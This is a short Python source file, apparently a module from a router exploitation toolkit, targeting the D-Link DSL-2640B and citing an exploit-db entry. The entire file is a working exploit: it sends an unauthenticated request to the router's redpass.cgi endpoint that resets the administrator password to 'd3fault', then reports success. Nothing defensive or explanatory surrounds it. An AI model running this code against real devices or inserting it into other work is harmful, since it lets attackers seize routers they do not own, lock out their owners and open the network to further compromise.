import urllib
import util
from ..router_vuln import RouterVuln

__router__ = 'DSL-2640B'
__vuln__='Change Admin Password'
class ChangeAdmin(RouterVuln):
	"""Modify the admin password.
	   http://www.exploit-db.com/exploits/18499/
	"""
	def __init__(self):
		super(ChangeAdmin,self).__init__()

	def run(self):
		util.Msg('Changing admin password to \'d3fault\'...')
		try:
			url = 'http://%s/redpass.cgi?sysPassword=d3fault&change=1'%self.ip
			response = urllib.urlopen(url).read()
			util.Msg('Done.  Admin password changed to \'d3fault\'')
		except Exception, e:
			util.Error('Error: %s'%e)
			return
